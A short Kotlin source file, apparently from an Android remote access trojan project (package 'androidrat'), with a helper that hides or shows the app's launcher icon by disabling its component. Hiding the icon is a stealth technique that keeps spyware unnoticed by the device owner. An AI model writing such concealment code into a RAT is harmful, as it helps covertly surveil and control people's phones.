package com.nqmgaming.androidrat.command.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object Functions {
    fun hideIcons(hideIcon: Boolean, context: Context) {
        if (hideIcon) {
            // Hide the icon
            val packageManager = context.packageManager
            val componentName = ComponentName(context, context.javaClass)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } else {
            // Show the icon
            val packageManager = context.packageManager
            val componentName = ComponentName(context, context.javaClass)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}